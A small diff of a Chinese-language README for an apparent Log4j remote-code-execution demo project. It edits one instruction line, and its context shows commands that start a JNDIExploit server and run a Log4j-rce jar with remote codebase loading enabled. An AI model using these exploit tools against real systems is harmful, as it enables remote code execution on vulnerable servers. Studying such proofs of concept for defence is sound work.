@@ -9,7 +9,7 @@
 `java -jar JNDIExploit-1.2-SNAPSHOT.jar -i ip`         
 
         
-下载之后使用idea编译将项目编译为jar之后使用以下命令触发   
+下载本项目之后使用idea编译将项目编译为jar之后使用以下命令触发   
 `java -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -jar Log4j-rce.jar`         
     
 下方是视频演示教学地址相信我你也可以变成光   
